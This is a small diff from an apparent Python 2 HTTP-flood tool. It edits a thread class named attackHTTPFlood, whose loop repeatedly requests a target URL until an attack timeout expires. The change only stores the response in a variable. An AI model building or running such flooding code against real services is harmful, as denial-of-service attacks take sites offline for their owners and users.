@@ -43,7 +43,7 @@ class attackHTTPFlood(threading.Thread):
         start = time.time()
         while time.time() - start < self.timeoutAttack:
             try:
-                urllib2.urlopen(self.target)
+                res = urllib2.urlopen(self.target)
             except IOError:
                 print "Could not open ", self.target
 
